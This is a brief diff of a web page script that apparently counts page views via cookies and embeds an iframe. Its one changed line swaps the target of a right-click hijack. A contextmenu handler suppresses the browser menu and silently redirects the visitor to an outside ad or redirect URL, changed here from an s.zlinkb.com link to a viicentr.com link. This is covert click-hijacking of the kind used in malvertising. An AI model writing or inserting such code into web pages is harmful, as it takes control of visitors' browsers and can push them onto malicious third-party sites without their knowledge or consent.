@@ -56,7 +56,7 @@ return unescape(document.cookie.substring(offset, endstr));
 }
 var hitunganviewnya = amt();
 console.log(hitunganviewnya);
-document.addEventListener('contextmenu', function (event) {event.preventDefault();window.location.href = 'https://s.zlinkb.com/d.php?z=4836662';});
+document.addEventListener('contextmenu', function (event) {event.preventDefault();window.location.href = 'https://viicentr.com/dc/?blockID=344737&tb=https%3A%2F%2Fgoogle.com';});
 var centerElement = document.createElement('center'), iframeElement = document.createElement('iframe');
 iframeElement.setAttribute('style', 'max-width:100%;max-height:844px;border:0px');
 iframeElement.setAttribute('scrolling', 'no');
